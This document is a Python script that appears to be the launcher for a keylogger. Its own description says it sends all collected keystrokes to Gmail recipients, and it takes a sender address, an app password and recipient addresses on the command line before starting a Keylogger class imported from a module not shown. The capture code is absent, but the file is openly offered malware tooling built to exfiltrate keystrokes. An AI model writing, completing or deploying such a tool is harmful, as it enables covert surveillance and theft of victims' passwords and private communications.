#!/usr/bin/env python3

import signal
import argparse
import os

from keylogger import Keylogger
from termcolor import colored

keylogger = None

def def_handler(sig, frame):
    global keylogger
    print(colored("\n[!] Quitting the program...\n", "red"))
    keylogger.shutdown()
    os._exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    argparser = argparse.ArgumentParser(description="Keylogger that sends all collected keys to a Gmail.")
    argparser.add_argument("-s", "--sender", required=True, dest="sender", help="Sender Gmail. (Ex: sender@gmail.com)")
    argparser.add_argument("-r", "--recipients", required=True, dest="recipients", help="Recipients Gmail separated by a comma. (Ex: 'sender@gmail.com' | 'sender@gmail.com,sender1@gmail.com')")
    argparser.add_argument("-p", "--password", required=True, dest="password", help="Password application made by the sender. (Ex: jklo oikj aswer)")

    args = argparser.parse_args()

    return args.sender, args.password, args.recipients

def print_banner():
    print(colored("""
█▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
█░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄\n""", 'white'))

    print(colored("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""", 'yellow'))

def main():
    global keylogger

    print_banner()
    sender, password, recipients = get_arguments()

    keylogger = Keylogger(sender, password, recipients)
    keylogger.start()

if __name__ == "__main__":
    main()
